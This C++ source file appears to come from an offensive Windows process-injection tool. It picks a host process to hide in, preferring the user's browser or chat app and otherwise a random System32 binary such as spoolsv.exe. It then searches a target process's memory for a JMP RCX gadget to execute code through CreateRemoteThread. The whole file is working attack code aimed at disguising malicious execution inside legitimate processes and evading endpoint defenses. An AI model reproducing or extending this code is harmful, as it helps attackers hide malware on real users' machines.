// FileChecker.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "WindowsSecurity.h"
#include "Browsers.h"
#include "ChatApplications.h"
#include "Helpers.h"
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <cstdlib>
#include <ctime>
using namespace std;


wchar_t* GetWindowsBinary()
{
	DWORD sz = sizeof(char) * MAX_PATH;
	const int szBinaries = 7;
	const char* binaries[szBinaries] = {
		"\\splwow64.exe",
		"\\System32\\printfilterpipelinesvc.exe",
		"\\System32\\PrintIsolationHost.exe",
		"\\System32\\spoolsv.exe",
		"\\System32\\upnpcont.exe",
		"\\System32\\conhost.exe",
		"\\System32\\convertvhd.exe"
	};

	char* path;
	size_t szLen;
	_dupenv_s(&path, &szLen, "SYSTEMROOT");
	
	char* retBinary = (char*)malloc(sz);
	ZeroMemory(retBinary, sz);
	int i = 0;
	//struct _stat buffer;
	do
	{
		strcpy_s(retBinary, sz, path);
		srand(time(0));
		i = rand() % szBinaries;
		strcat_s(retBinary, sz, binaries[i]);
		if (FileExistsAndIs64Bit(retBinary))
		{
			
			printf("[*] Windows Binary: %s\n", retBinary);
		}
		else
		{
			ZeroMemory(retBinary, sz);
		}
	} while (retBinary == NULL);
	wchar_t* finalResult = CharToWcharT(retBinary);
	return finalResult;
}

wchar_t* GetValidExecutable()
{
	// If not high integrity, find some applications
	// a user might use.
	if (!IsHighIntegrity())
	{
		// Try and get the default browser.
		wchar_t* defaultBrowser = GetDefaultBrowser();

		if (defaultBrowser == NULL)
		{
			// Otherwise, attempt to find default browser paths.
			wchar_t* chromePath = GetGoogleChromePath();
			if (chromePath != NULL)
			{
				return chromePath;
			}

			wchar_t* chromeSxSPath = GetGoogleChromeSxSPath();
			if (chromeSxSPath != NULL)
			{
				return chromeSxSPath;
			}

			wchar_t* firefoxPath = GetFireFoxPath();
			if (firefoxPath != NULL)
			{
				return firefoxPath;
			}
		}
		else
		{
			return defaultBrowser;
		}
		// We've failed to find a default browser.
		// Let's look for chat applications instead.
		wchar_t* chatApp = GetChatApplication();
		if (chatApp != NULL)
		{
			return chatApp;
		}
	}

	// If we can't find the above, or we're a high
	// integrity process (like running under SYSTEM)
	// then get a Windows binary to launch.
	wchar_t* windowsBinary = GetWindowsBinary();
	return windowsBinary;
}

// Helper function to find a jmp rcx gadget for CreateRemoteThread.
// Needs more testing and only really useful on certain binaries.
// I know Chrome and FireFox work for sure but others are questionable.
int FindRetGadget(wchar_t* binaryName, void** retGadget, int pid)
{
	//int pid = 11744; // temp for testing
	char buffer[4096];
	SIZE_T bytesWritten = 0, bytesRead = 0;
	HANDLE threadHandle;
	DWORD i = 0, j = 0, threadId = 0;

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (processHandle == INVALID_HANDLE_VALUE || processHandle == NULL) {
		printf("[X] Error: Could not open process with PID %d\n", pid);
		return NULL;
	}

	char* base = (char*)LoadLibrary(binaryName);
	if (base == NULL)
	{
		wprintf(L"[X] Could not load %s.\n", binaryName);
		return NULL;
	}

	ifstream file(binaryName, ios::in | ios::binary | ios::ate);
	int fileSize = 0;
	if (file.is_open())
	{
		file.seekg(0, ios::end);
		fileSize = file.tellg();
		file.close();
	}

	if (fileSize == 0)
	{
		printf("[X] Could not open file to determine size.\n");
		return 1;
	}

	wprintf(L"Size of %s is %d\n", binaryName, fileSize);
	// Hunting for a JMP RCX (\xff\xe1) instruction
	for (i = 0; i < fileSize && *retGadget == NULL; i += bytesRead) {
		printf("[*] Hunting for gadget at address %p\n", (char *)base + i);
		ReadProcessMemory(processHandle, (char *)base + i, buffer, 4096, &bytesRead);
		for (j = 0; j + 1 < bytesRead && *retGadget == NULL; j++) {
			if (buffer[j] == '\xff' && buffer[j + 1] == '\xe1') {
				//printf("[+] Found retGadget!\n");
				*retGadget = (char *)base + i + j;
			}
		}
	}
	if (*retGadget == NULL) {
		printf("[X] Error: Could not find JMP gadget\n");
		return 1;
	}
	wprintf(L"[*] Found JMP RCX gadget at address %p for %s\n", *retGadget, binaryName);
	return 0;
}